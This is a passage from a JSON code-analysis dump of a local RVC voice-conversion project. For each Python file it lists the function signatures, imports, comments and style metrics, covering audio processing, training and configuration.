          "def set_devices(self, input_device, output_device):\n\"\"\"\u8bbe\u7f6e\u8f93\u51fa\u8bbe\u5907\"\"\"\nsd.default.device[0] = self.input_devices_indices[\nself.input_devices.index(input_device)\n]\nsd.default.device[1] = self.output_devices_indices[\nself.output_devices.index(output_device)\n]\nprintt(\"Input device: %s:%s\", str(sd.default.device[0]), input_device)\nprintt(\"Output device: %s:%s\", str(sd.default.device[1]), output_device)",
          "def get_device_samplerate(self):",
          "def get_device_channels(self):"
        ],
        "class_defs": [
          "class Harvest(multiprocessing.Process):",
          "class GUIConfig:",
          "class GUI:"
        ],
        "imports": [
          "import os",
          "import sys",
          "from dotenv import load_dotenv",
          "import shutil",
          "import multiprocessing",
          "import numpy as np",
          "import pyworld",
          "import json",
          "import multiprocessing",
          "import re",
          "import time",
          "from multiprocessing import Queue, cpu_count",
          "import librosa",
          "from infer.modules.gui import TorchGate",
          "import numpy as np",
          "import FreeSimpleGUI as sg",
          "import sounddevice as sd",
          "import torch",
          "import torch.nn.functional as F",
          "import torchaudio.transforms as tat",
          "import infer.lib.rtrvc as rtrvc",
          "from i18n.i18n import I18nAuto",
          "from configs import Config",
          "from infer.lib.rvcmd import check_all_assets, download_all_assets"
        ],
        "comments": [
          "# device = rvc_for_realtime.config.device",
          "# device = torch.device(",
          "#     \"cuda\"",
          "#     if torch.cuda.is_available()",
          "#     else (\"mps\" if torch.backends.mps.is_available() else \"cpu\")",
          "# )",
          "# [",
          "#     sg.Text(\"\u8bbe\u5907\u5ef6\u8fdf\"),",
          "#     sg.Slider(",
          "#         range=(0, 1),",
          "#         key=\"device_latency\",",
          "#         resolution=0.001,",
          "#         orientation=\"h\",",
          "#         default_value=data.get(\"device_latency\", 0.1),",
          "#         enable_events=True,",
          "#     ),",
          "# ],",
          "# sg.Checkbox(",
          "#     \"JIT\u52a0\u901f\",",
          "#     default=self.config.use_jit,",
          "#     key=\"use_jit\",",
          "#     enable_events=False,",
          "# ),",
          "# [sg.Text(\"\u6ce8\uff1a\u9996\u6b21\u4f7f\u7528JIT\u52a0\u901f\u65f6\uff0c\u4f1a\u51fa\u73b0\u5361\u987f\uff0c\\n      \u5e76\u4f34\u968f\u4e00\u4e9b\u566a\u97f3\uff0c\u4f46\u8fd9\u662f\u6b63\u5e38\u73b0\u8c61\uff01\")],",
          "# \"device_latency\": values[\"device_latency\"],",
          "# \"use_jit\": values[\"use_jit\"],",
          "# Parameter hot update",
          "# Other parameters do not support hot update",
          "# self.device_latency = values[\"device_latency\"]",
          "# input noise reduction and resampling",
          "# infer",
          "# output noise reduction",
          "# volume envelop mixing",
          "# SOLA algorithm from https://github.com/yxlllc/DDSP-SVC",
          "# printt(\"sola_offset = %d\", int(sola_offset))",
          "# printt(\"Infer time: %.2f\", total_time)"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from . import ipex",
          "import sys"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/synthesizer.py",
        "docstrings": [],
        "function_defs": [
          "def get_synthesizer(cpt: OrderedDict, device=torch.device(\"cpu\")):",
          "def load_synthesizer(",
          "def synthesizer_jit_export("
        ],
        "class_defs": [],
        "imports": [
          "from collections import OrderedDict",
          "from io import BytesIO",
          "import torch",
          "from .layers.synthesizers import SynthesizerTrnMsNSFsid",
          "from .jit import load_inputs, export_jit_model, save_pickle",
          "from rvc.synthesizer import load_synthesizer"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/hubert.py",
        "docstrings": [],
        "function_defs": [
          "def pad_to_multiple(x, multiple, dim=-1, value=0):",
          "def extract_features(",
          "def undo_pad(a, b, c):",
          "def compute_mask_indices(",
          "def arrange(s, e, length, keep_length):",
          "def apply_mask(self, x, padding_mask, target_list):",
          "def get_hubert(model_path=\"assets/hubert/hubert_base.pt\", device=torch.device(\"cpu\")):",
          "def _apply_mask(x, padding_mask, target_list):",
          "def _extract_features(",
          "def hubert_extract_features(",
          "def _hubert_extract_features(",
          "def infer(source, padding_mask, output_layer: torch.Tensor):"
        ],
        "class_defs": [],
        "imports": [
          "import math",
          "import random",
          "from typing import Optional, Tuple",
          "from fairseq.checkpoint_utils import load_model_ensemble_and_task",
          "from fairseq.utils import index_put",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F"
        ],
        "comments": [
          "# @torch.jit.script",
          "# Inspired from https://github.com/lucidrains/local-attention/blob/master/local_attention/local_attention.py#L41",
          "# pad to the sequence length dimension",
          "# B x T x C -> T x B x C",
          "# T x B x C -> B x T x C",
          "# undo paddding",
          "# add a random number for probabilistic rounding",
          "# hubert_model.forward=infer",
          "# hubert_model.forward"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 7,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/configs/config.py",
        "docstrings": [],
        "function_defs": [
          "def singleton_variable(func):",
          "def wrapper(*args, **kwargs):",
          "def __init__(self):",
          "def load_config_json() -> dict:",
          "def arg_parse() -> tuple:",
          "def has_mps() -> bool:",
          "def has_xpu() -> bool:",
          "def use_fp32_config(self):",
          "def device_config(self):",
          "def __init__(self):",
          "def load_config_json() -> dict:",
          "def use_fp32_config(self):",
          "def device_config(self):"
        ],
        "class_defs": [
          "class Config:",
          "class CPUConfig:"
        ],
        "imports": [
          "import argparse",
          "import os",
          "import sys",
          "import json",
          "import shutil",
          "from multiprocessing import cpu_count",
          "import torch",
          "import logging",
          "import torch_directml"
        ],
        "comments": [
          "# TODO: move device selection into rvc",
          "# has_mps is only available in nightly pytorch (for now) and MasOS 12.3+.",
          "# check `getattr` and try it for compatibility",
          "# 6G\u663e\u5b58\u914d\u7f6e",
          "# 5G\u663e\u5b58\u914d\u7f6e",
          "# 5G\u663e\u5b58\u914d\u7f6e"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@singleton_variable",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@singleton_variable",
          "@staticmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/configs/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .config import singleton_variable, Config, CPUConfig"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/i18n/scan_i18n.py",
        "docstrings": [],
        "function_defs": [
          "def extract_i18n_strings(node):"
        ],
        "class_defs": [],
        "imports": [
          "import ast",
          "import glob",
          "import json",
          "from collections import OrderedDict"
        ],
        "comments": [
          "# scan the directory for all .py files (recursively)",
          "# for each file, parse the code into an AST",
          "# for each AST, extract the i18n strings",
          "# Define the standard file name",
          "# write back"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/i18n/locale_diff.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import json",
          "import os",
          "from collections import OrderedDict"
        ],
        "comments": [
          "# Define the standard file name",
          "# Find all JSON files in the directory",
          "# Load the standard file",
          "# Loop through each language file",
          "# Load the language file",
          "# Find the difference between the language file and the standard file",
          "# Add any missing keys to the language file",
          "# Del any extra keys to the language file",
          "# Sort the keys of the language file to match the order of the standard file",
          "# Save the updated language file"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/i18n/i18n.py",
        "docstrings": [],
        "function_defs": [
          "def load_language_list(language):",
          "def __init__(self, language=None):",
          "def __call__(self, key):",
          "def __repr__(self):"
        ],
        "class_defs": [
          "class I18nAuto:"
        ],
        "imports": [
          "import json",
          "import locale",
          "import os",
          "from configs import singleton_variable"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@singleton_variable"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/rvcmd.py",
        "docstrings": [],
        "function_defs": [
          "def sha256(f) -> str:",
          "def check_model(",
          "def check_all_assets(update=False) -> bool:",
          "def download_and_extract_tar_gz(url: str, folder: str):",
          "def download_and_extract_zip(url: str, folder: str):",
          "def download_dns_yaml(url: str, folder: str):",
          "def download_all_assets(tmpdir: str, version=\"0.2.5\"):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "from pathlib import Path",
          "import hashlib",
          "import requests",
          "from io import BytesIO",
          "import logging",
          "import tarfile",
          "import zipfile",
          "import subprocess",
          "import platform"
        ],
        "comments": [
          "# Read and update hash in chunks of 4M"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/slicer2.py",
        "docstrings": [],
        "function_defs": [
          "def get_rms(",
          "def __init__(",
          "def _apply_slice(self, waveform, begin, end):",
          "def slice(self, waveform):",
          "def main():"
        ],
        "class_defs": [
          "class Slicer:"
        ],
        "imports": [
          "import numpy as np",
          "import os.path",
          "from argparse import ArgumentParser",
          "from .audio import load_audio, save_audio"
        ],
        "comments": [
          "# This function is obtained from librosa.",
          "# put our new within-frame axis at the end for now",
          "# Reduce the shape on the framing axis",
          "# Downsample along the target axis",
          "# Calculate power",
          "# @timeit",
          "# Keep looping while frame is silent.",
          "# Record start of silent frames.",
          "# Keep looping while frame is not silent and silence start has not been recorded.",
          "# Clear recorded silence start if interval is not enough or clip is too short",
          "# Need slicing. Record the range of silent frames to be removed.",
          "# Deal with trailing silence.",
          "# Apply and return slices."
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/audio.py",
        "docstrings": [],
        "function_defs": [
          "def float_to_int16(audio: np.ndarray) -> np.ndarray:",
          "def float_np_array_to_wav_buf(wav: np.ndarray, sr: int, f32=False) -> BytesIO:",
          "def save_audio(path: str, audio: np.ndarray, sr: int, f32=False, format=\"wav\"):",
          "def wav2(i: BytesIO, o: BufferedWriter, format: str):",
          "def load_audio(",
          "def process_packet(packet: List[AudioFrame]):",
          "def frame_iter(container):",
          "def resample_audio(",
          "def get_audio_properties(input_path: str) -> Tuple[int, int]:"
        ],
        "class_defs": [],
        "imports": [
          "from io import BufferedWriter, BytesIO",
          "from pathlib import Path",
          "from typing import Dict, Tuple, Optional, Union, List",
          "import os",
          "import math",
          "import wave",
          "import numpy as np",
          "from numba import jit",
          "import av",
          "from av.audio.resampler import AudioResampler",
          "from av.audio.frame import AudioFrame",
          "import scipy.io.wavfile as wavfile"
        ],
        "comments": [
          "# Estimated maximum total number of samples to pre-allocate the array",
          "# AV stores length in microseconds by default",
          "# frame.pts = None  # \u6e05\u9664\u65f6\u95f4\u6233\uff0c\u907f\u514d\u91cd\u65b0\u91c7\u6837\u95ee\u9898",
          "# \u68c0\u67e5 decoded_audio \u662f\u5426\u6709\u8db3\u591f\u7684\u7a7a\u95f4\uff0c\u5e76\u5728\u5fc5\u8981\u65f6\u8c03\u6574\u5927\u5c0f",
          "# Truncate the array to the actual size",
          "# Create a stream in the output container",
          "# Copy packets from the input file to the output file",
          "# frame.pts = None  # Clear presentation timestamp to avoid resampling issues",
          "# Close the containers"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": [
          "@jit(nopython=True)"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/rtrvc.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward_dml(ctx, x, scale):",
          "def set_default_model():",
          "def set_jit_model():",
          "def set_key(self, new_key):",
          "def set_formant(self, new_formant):",
          "def set_index_rate(self, new_index_rate):",
          "def infer(",
          "def _get_f0("
        ],
        "class_defs": [
          "class RVC:"
        ],
        "imports": [
          "from io import BytesIO",
          "import os",
          "from typing import Union, Literal, Optional",
          "from pathlib import Path",
          "import fairseq",
          "import faiss",
          "import numpy as np",
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "from torchaudio.transforms import Resample",
          "from rvc.f0 import Generator",
          "from rvc.synthesizer import load_synthesizer",
          "from rvc.jit import get_jit_model",
          "from rvc.synthesizer import synthesizer_jit_export"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/uvr5/vr.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, agg, model_path, device, is_half, tta=False):",
          "def _path_audio_(self, music_file, ins_root=None, vocal_root=None, format=\"flac\"):"
        ],
        "class_defs": [
          "class AudioPre:"
        ],
        "imports": [
          "import os",
          "import logging",
          "import librosa",
          "import numpy as np",
          "from infer.lib.audio import save_audio",
          "import torch",
          "from infer.lib.uvr5_pack.lib_v5 import nets_123821KB as Nets",
          "from infer.lib.uvr5_pack.lib_v5 import spec_utils",
          "from infer.lib.uvr5_pack.lib_v5.model_param_init import ModelParameters",
          "from infer.lib.uvr5_pack.lib_v5.nets import CascadedNet",
          "from infer.lib.uvr5_pack.utils import inference"
        ],
        "comments": [
          "# Processing Options",
          "# Constants",
          "# print(bands_n)",
          "# Stft of wave source",
          "# pdb.set_trace()",
          "# Postprocess"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/uvr5/modules.py",
        "docstrings": [],
        "function_defs": [
          "def uvr(model_name, inp_root, save_root_vocal, paths, save_root_ins, agg, format0):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import traceback",
          "import logging",
          "from infer.lib.audio import resample_audio, get_audio_properties",
          "import torch",
          "from configs import Config",
          "from infer.modules.uvr5.mdxnet import MDXNetDereverb",
          "from infer.modules.uvr5.vr import AudioPre"
        ],
        "comments": [
          "# Check the audio stream's properties"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/uvr5/mdxnet.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def stft(self, x):",
          "def istft(self, x, freq_pad=None):",
          "def get_models(device, dim_f, dim_t, n_fft):",
          "def __init__(self, args):",
          "def demix(self, mix):",
          "def demix_base(self, mixes, margin_size):",
          "def prediction(self, m, vocal_root, others_root, format):",
          "def __init__(self, chunks, device):",
          "def _path_audio_(self, input, vocal_root, others_root, format):"
        ],
        "class_defs": [
          "class ConvTDFNetTrim:",
          "class Predictor:",
          "class MDXNetDereverb:"
        ],
        "imports": [
          "import os",
          "import logging",
          "import numpy as np",
          "import torch",
          "from tqdm import tqdm",
          "from infer.lib.audio import load_audio, save_audio",
          "import onnxruntime as ort"
        ],
        "comments": [
          "# del self.model"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/vc/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .pipeline import Pipeline",
          "from .modules import VC",
          "from .utils import get_index_path_from_model, load_hubert",
          "from .info import show_info",
          "from .hash import model_hash_ckpt, hash_id, hash_similarity"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/vc/hash.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, seed):",
          "def __enter__(self):",
          "def __exit__(self, type, value, traceback):",
          "def original_audio_storage():",
          "def original_audio():",
          "def original_audio_time_minus():",
          "def original_audio_freq_minus():",
          "def original_rmvpe_f0():",
          "def _cut_u16(n):",
          "def wave_hash(time_field):",
          "def model_hash(config, tgt_sr, net_g, if_f0, version):",
          "def model_hash_ckpt(cpt):",
          "def model_hash_from(path):",
          "def _extend_difference(n, a, b):",
          "def hash_similarity(h1: str, h2: str) -> float:",
          "def hash_id(h: str) -> str:"
        ],
        "class_defs": [
          "class TorchSeedContext:"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import hashlib",
          "import pathlib",
          "from scipy.fft import fft",
          "from pybase16384 import encode_to_string, decode_from_string",
          "from configs import CPUConfig, singleton_variable",
          "from rvc.synthesizer import get_synthesizer",
          "from .pipeline import Pipeline",
          "from .utils import load_hubert"
        ],
        "comments": [
          "# wave_hash will change time_field, use carefully"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": [
          "@singleton_variable",
          "@singleton_variable",
          "@singleton_variable",
          "@singleton_variable",
          "@singleton_variable"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/vc/rmvpe.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, model_path, device=\"cpu\"):",
          "def forward(self, x):",
          "def convert_to_onnx(model_path, onnx_path):"
        ],
        "class_defs": [
          "class RMVPE(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import numpy as np",
          "import os"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 5,
        "decorators": [
          "@staticmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/vc/utils.py",
        "docstrings": [],
        "function_defs": [
          "def get_index_path_from_model(sid):",
          "def load_hubert(device, is_half):"
        ],
        "class_defs": [],
        "imports": [
          "import os, pathlib",
          "from fairseq import checkpoint_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/vc/pipeline.py",
        "docstrings": [],
        "function_defs": [
          "def change_rms(data1, sr1, data2, sr2, rate):  # 1\u662f\u8f93\u5165\u97f3\u9891\uff0c2\u662f\u8f93\u51fa\u97f3\u9891,rate\u662f2\u7684\u5360\u6bd4",
          "def __init__(self, tgt_sr, config):",
          "def vc(",
          "def pipeline("
        ],
        "class_defs": [
          "class Pipeline(object):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "import logging",
          "from pathlib import Path",
          "from time import time",
          "import faiss",
          "import librosa",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "from scipy import signal",
          "from rvc.f0 import Generator"
        ],
        "comments": [
          "# print(data1.max(),data2.max())",
          "# _, I = index.search(npy, 1)",
          "# npy = big_npy[I.squeeze()]",
          "# and file_big_npy != \"\"",
          "# and os.path.exists(file_big_npy) == True"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/vc/modules.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, config):",
          "def get_vc(self, sid, *to_return_protect):",
          "def vc_single(",
          "def vc_multi("
        ],
        "class_defs": [
          "class VC:"
        ],
        "imports": [
          "import traceback",
          "import logging",
          "import os",
          "import numpy as np",
          "import torch",
          "from io import BytesIO",
          "from infer.lib.audio import load_audio, wav2, save_audio, float_np_array_to_wav_buf",
          "from rvc.synthesizer import get_synthesizer, load_synthesizer",
          "from .info import show_model_info",
          "from .pipeline import Pipeline",
          "from .utils import get_index_path_from_model, load_hubert"
        ],
        "comments": [
          "###\u697c\u4e0b\u4e0d\u8fd9\u4e48\u6298\u817e\u6e05\u7406\u4e0d\u5e72\u51c0",
          "# file_big_npy,"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 5,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/vc/info.py",
        "docstrings": [],
        "function_defs": [
          "def show_model_info(cpt, show_long_id=False):",
          "def show_info(path):"
        ],
        "class_defs": [],
        "imports": [
          "import traceback",
          "from i18n.i18n import I18nAuto",
          "from datetime import datetime",
          "import torch",
          "from .hash import model_hash_ckpt, hash_id, hash_similarity"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/gui/torchgate.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def _generate_mask_smoothing_filter(self) -> Union[torch.Tensor, None]:\n\"\"\"\nA PyTorch module that applies a spectral gate to an input signal using the STFT.\n\nReturns:\nsmoothing_filter (torch.Tensor): a 2D tensor representing the smoothing filter,\nwith shape (n_grad_freq, n_grad_time), where n_grad_freq is the number of frequency\nbins to smooth and n_grad_time is the number of time frames to smooth.\nIf both self.freq_mask_smooth_hz and self.time_mask_smooth_ms are None, returns None.\n\"\"\"",
          "def _stationary_mask(",
          "def _nonstationary_mask(self, X_abs: torch.Tensor) -> torch.Tensor:\n\"\"\"\nComputes a non-stationary binary mask to filter out noise in a log-magnitude spectrogram.\n\nArguments:\nX_abs (torch.Tensor): 2D tensor of shape (frames, freq_bins) containing the magnitude spectrogram.\n\nReturns:\nsig_mask (torch.Tensor): Binary mask of the same shape as X_abs, where values greater than the threshold\nare set to 1, and the rest are set to 0.",
          "def forward("
        ],
        "class_defs": [
          "class TorchGate(torch.nn.Module):"
        ],
        "imports": [
          "import torch",
          "from rvc.f0.stft import STFT",
          "from torch.nn.functional import conv1d, conv2d",
          "from typing import Union, Optional",
          "from .utils import linspace, temperature_sigmoid, amp_to_db"
        ],
        "comments": [
          "# General Params",
          "# STFT Params",
          "# Stationary Params",
          "# Non-Stationary Params",
          "# Smooth Mask Params",
          "# calculate mean and standard deviation along the frequency axis",
          "# compute noise threshold",
          "# create binary mask by thresholding the spectrogram",
          "# Compute slowness ratio and apply temperature sigmoid",
          "# Compute short-time Fourier transform (STFT)",
          "# Compute signal mask based on stationary or nonstationary assumptions",
          "# Propagate decrease in signal power",
          "# Smooth signal mask with 2D convolution",
          "# Apply signal mask to STFT magnitude and phase components",
          "# Inverse STFT to obtain time-domain signal"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": [
          "@torch.no_grad()",
          "@torch.no_grad()",
          "@torch.no_grad()",
          "@torch.no_grad()"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/gui/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "from .torchgate import TorchGate"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/gui/utils.py",
        "docstrings": [],
        "function_defs": [
          "def amp_to_db(",
          "def temperature_sigmoid(x: torch.Tensor, x0: float, temp_coeff: float) -> torch.Tensor:\n\"\"\"\nApply a sigmoid function with temperature scaling.\n\nArguments:\nx {[torch.Tensor]} -- [Input tensor.]\nx0 {[float]} -- [Parameter that controls the threshold of the sigmoid.]\ntemp_coeff {[float]} -- [Parameter that controls the slope of the sigmoid.]\n\nReturns:",
          "def linspace("
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "from torch.types import Number"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@torch.no_grad()",
          "@torch.no_grad()",
          "@torch.no_grad()"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/train/rmvpe_onnx.py",
        "docstrings": [],
        "function_defs": [
          "def convert_to_onnx():"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "from infer.modules.vc.rmvpe import RMVPE"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/train/extract_f0_print.py",
        "docstrings": [],
        "function_defs": [
          "def printt(strr):",
          "def __init__(self, is_half: bool, device=\"cpu\", samplerate=16000, hop_size=160):",
          "def go(self, paths, f0_method):"
        ],
        "class_defs": [
          "class FeatureInput(object):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "from pathlib import Path",
          "from dotenv import load_dotenv",
          "import logging",
          "import numpy as np",
          "from infer.lib.audio import load_audio",
          "from rvc.f0 import Generator",
          "from multiprocessing import Process"
        ],
        "comments": [
          "# exp_dir=r\"E:\\codes\\py39\\dataset\\mi-test\"",
          "# n_p=16",
          "# f = open(\"%s/log_extract_f0.log\"%exp_dir, \"w\")"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/train/preprocess.py",
        "docstrings": [],
        "function_defs": [
          "def println(strr):",
          "def __init__(self, sr, exp_dir, per=3.7):",
          "def norm_write(self, tmp_audio, idx0, idx1):",
          "def pipeline(self, path):",
          "def pipeline_mp(self, infos):",
          "def pipeline_mp_inp_dir(self, inp_root, n_p):",
          "def preprocess_trainset(inp_root, sr, n_p, exp_dir, per):"
        ],
        "class_defs": [
          "class PreProcess:"
        ],
        "imports": [
          "import multiprocessing",
          "import os",
          "import sys",
          "from scipy import signal",
          "import os",
          "import traceback",
          "import numpy as np",
          "from infer.lib.audio import load_audio, float_np_array_to_wav_buf, save_audio",
          "from infer.lib.slicer2 import Slicer"
        ],
        "comments": [
          "# Skip .DS_Store files",
          "# zero phased digital filter cause pre-ringing noise...",
          "# audio = signal.filtfilt(self.bh, self.ah, audio)"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/train/train.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def record(self):",
          "def main():",
          "def run(rank, n_gpus, hps: utils.HParams, logger: logging.Logger):",
          "def train_and_evaluate("
        ],
        "class_defs": [
          "class EpochRecorder:"
        ],
        "imports": [
          "import os",
          "import sys",
          "import logging",
          "from typing import Tuple",
          "import datetime",
          "from infer.lib.train import utils",
          "from random import randint, shuffle",
          "import torch",
          "import intel_extension_for_pytorch as ipex  # pylint: disable=import-error, unused-import",
          "from rvc.ipex import ipex_init, gradscaler_init",
          "from torch.xpu.amp import autocast",
          "from torch.cuda.amp import GradScaler, autocast",
          "from torch.cuda.amp import GradScaler, autocast",
          "from time import sleep",
          "from time import time as ttime",
          "import torch.distributed as dist",
          "import torch.multiprocessing as mp",
          "from torch.nn import functional as F",
          "from torch.nn.parallel import DistributedDataParallel as DDP",
          "from torch.utils.data import DataLoader",
          "from torch.utils.tensorboard import SummaryWriter",
          "from infer.lib.train.data_utils import (",
          "from rvc.layers.discriminators import MultiPeriodDiscriminator",
          "from rvc.layers.synthesizers import SynthesizerTrnMs256NSFsid as RVC_Model_f0",
          "from rvc.layers.synthesizers import (",
          "from rvc.layers.synthesizers import (",
          "from infer.lib.train.losses import (",
          "from infer.lib.train.mel_processing import mel_spectrogram_torch, spec_to_mel_torch",
          "from infer.lib.train.process_ckpt import save_small_model",
          "from rvc.layers.utils import ("
        ],
        "comments": [
          "# patch to unblock people without gpus. there is probably a better way.",
          "# logger = utils.get_logger(hps.model_dir)",
          "# utils.check_git_hash(hps.model_dir)",
          "# [100, 200, 300, 400, 500, 600, 700, 800, 900, 1000, 1200,1400],  # 16s",
          "# It is possible that dataloader's workers are out of shared memory. Please try to raise your shared memory limit.",
          "# num_workers=8 -> num_workers=4",
          "# net_g = DDP(net_g, device_ids=[rank], find_unused_parameters=True)",
          "# net_d = DDP(net_d, device_ids=[rank], find_unused_parameters=True)",
          "# _, _, _, epoch_str = utils.load_checkpoint(utils.latest_checkpoint_path(hps.model_dir, \"G_*.pth\"), net_g, optim_g,load_opt=0)",
          "# epoch_str = 1",
          "# global_step = 0",
          "# traceback.print_exc()",
          "# Prepare data iterator",
          "# Use Cache",
          "# Make new cache",
          "# Unpack",
          "# Load on CUDA",
          "# Cache on list",
          "# Load shuffled cache",
          "# Loader",
          "# Run steps",
          "# Data",
          "## Unpack",
          "## Load on CUDA",
          "# wave_lengths = wave_lengths.cuda(rank, non_blocking=True)",
          "# Calculate",
          "# Discriminator",
          "# Generator",
          "# Amor For Tensorboard display",
          "# /Run steps"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
